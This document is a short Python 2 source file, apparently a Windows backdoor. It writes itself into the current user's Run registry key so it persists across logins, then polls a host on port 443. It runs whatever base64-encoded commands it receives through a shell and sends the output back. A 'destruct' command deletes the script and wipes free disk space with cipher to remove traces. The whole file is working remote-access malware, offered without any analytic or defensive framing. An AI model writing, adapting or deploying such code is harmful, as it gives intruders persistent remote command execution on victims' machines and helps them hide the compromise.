import socket
import subprocess
import os
import base64
import time
import sys
import _winreg
from _winreg import HKEY_CURRENT_USER as HKCU


def basic_persistence():
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    bin_path = sys.executable

    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, bin_path)
        _winreg.CloseKey(reg_key)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'


def destruct():
    client.close()
    os.remove(self_path)
    folder_path = os.path.dirname(self_path)
    os.system("cipher /W:%s" % folder_path)


def lets_talk():
    data = None
    while data is None:
        try:
            client.connect((host, port))
            client.send(p_message)

            if data == base64.b64encode('destruct'):
                destruct()
                sys.exit()

            data = client.recv(BUFFER_SIZE)
            process = subprocess.Popen(
                base64.b64decode(data),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            stdout_value = process.stdout.read() + process.stderr.read()
            client.send(base64.b64encode(stdout_value))
            time.sleep(5)
        except:
            pass
        else:
            break


if __name__ == "__main__":
    p_status, p_message = basic_persistence()
    self_path = os.path.abspath(__file__)
    host = socket.gethostname()
    port = 443
    BUFFER_SIZE = 4096
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        lets_talk()
        time.sleep(30)
